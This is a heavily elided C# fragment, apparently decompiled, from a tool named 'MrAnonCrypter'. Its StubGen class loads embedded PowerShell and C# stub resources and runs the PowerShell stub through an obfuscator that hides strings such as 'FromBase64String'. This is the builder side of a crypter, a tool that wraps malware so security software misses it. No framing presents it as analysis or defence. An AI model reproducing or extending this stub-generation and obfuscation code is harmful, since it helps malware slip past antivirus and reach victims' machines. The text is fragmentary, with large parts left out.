...
namespace MrAnonCrypter
{
    internal class StubGen
    {
        ...
        {
            string str = Obfuscator.Powershell(Encoding.UTF8.GetString(Utils.Resources["Stub.ps1"]), new string[14]
            {
                "FromBase64String",
                "ReadLines",
                "ElementAt",
        ...
        {
            string str1 = Encoding.UTF8.GetString(Utils.Resources["Stub.cs"]);
            StringBuilder stringBuilder = new StringBuilder();
            if (mtaThread)
        ...
        {
            string bcs = Encoding.UTF8.GetString(Utils.Resources["BStub.cs"]);
